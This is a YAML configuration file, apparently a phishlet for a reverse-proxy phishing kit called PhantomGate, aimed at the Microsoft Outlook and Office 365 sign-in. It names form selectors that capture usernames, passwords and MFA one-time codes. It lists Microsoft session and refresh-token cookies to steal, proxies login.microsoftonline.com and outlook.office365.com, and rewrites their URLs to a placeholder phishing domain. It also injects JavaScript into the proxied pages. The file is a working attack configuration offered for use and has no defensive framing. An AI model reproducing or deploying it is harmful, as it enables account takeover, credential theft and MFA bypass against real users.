name: Microsoft Outlook
author: PhantomGate
version: 1.0.0
description: Microsoft Outlook Web App authentication

auth:
  domains:
    - login.microsoftonline.com
    - login.live.com
    - outlook.office365.com
  
  login:
    domain: login.microsoftonline.com
    path: /common/oauth2/v2.0/authorize
    username:
      selector: "input[name='loginfmt']"
      capture: true
    password:
      selector: "input[name='passwd']"
      capture: true
  
  mfa:
    otp:
      selector: "input[name='otc']"
      capture: true
  
  tokens:
    cookies:
      - name: ESTSAUTH
        regex: ".*"
      - name: ESTSAUTHPERSISTENT
        regex: ".*"
      - name: buid
        regex: ".*"
      - name: x-ms-RefreshTokenCredential
        regex: ".*"

proxy:
  hosts:
    - domain: login.microsoftonline.com
      inject: true
    - domain: outlook.office365.com
      inject: true

filters:
  sub_filters:
    - domain: login.microsoftonline.com
      search: "https://login.microsoftonline.com"
      replace: "https://{phishing_domain}"
    - domain: outlook.office365.com
      search: "https://outlook.office365.com"
      replace: "https://{phishing_domain}"

injection:
  js: |
    document.cookie = "PhantomGate=1; path=/";
